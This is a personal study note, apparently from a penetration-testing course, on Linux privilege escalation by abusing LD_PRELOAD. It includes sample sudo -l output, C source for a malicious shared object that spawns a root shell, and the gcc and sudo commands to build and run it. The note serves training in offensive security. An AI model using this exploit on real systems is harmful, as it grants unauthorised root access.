---
id: Shared Objects
aliases: []
tags:
  - Linux/Privesc/Shared-Objects
links: "[[Privesc]]"
---

<!-- Shared Objects {{{-->
# Shared Objects



<!-- }}} -->

<!-- Shared Libraries {{{-->
# Shared Libraries

Linux programs use compiled libraries to avoid reimplementing
the same functionality across multiple programs

- Static libraries (`.a`)
- Dynamically linked shared object libraries (`.so`)

Dynamic libraries can be modified to control
the execution of the program that calls them

<!-- Exploit {{{-->
## Exploit

<!-- LD_PRELOAD {{{-->
### LD_PRELOAD

Specify the location of dynamic libraries by modifying the
`LD_RUN_PATH` or `LD_LIBRARY_PATH` environment variables

<!-- Tip {{{-->
> [!tip]-
>
> It may be also possible to
> - Compile the program with the `-rpath` or `-rpath-link` flags
> - Specify another directory containing the libraries within
>   `/etc/ld.so.conf`
<!-- }}} -->

1. Find a user with `sudo` privileges

```sh
sudo -l
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> htb_student@NIX02:~$ sudo -l
> ```
> ```sh
> Matching Defaults entries for daniel.carter on NIX02:
>     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD
>
> User daniel.carter may run the following commands on NIX02:
>     (root) NOPASSWD: /usr/sbin/apache2 restart
> ```
>
> - The user can restart the Apache service as `root`
> - `/etc/sudoers` is specifying the absolute path
<!-- }}} -->

2. Compile the exploit

<!-- Exploit {{{-->
> [!tip]- Exploit
>
> ```c
> #include <stdio.h>
> #include <sys/types.h>
> #include <stdlib.h>
> #include <unistd.h>
>
> void _init() {
> unsetenv("LD_PRELOAD");
> setgid(0);
> setuid(0);
> system("/bin/bash");
> }
> ```
<!-- }}} -->

```sh
gcc -fPIC -shared -o root.so root.c -nostartfiles
```

3. Run the exploit

```sh
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```

<!-- }}} -->

___
<!-- }}} -->

<!-- }}} -->
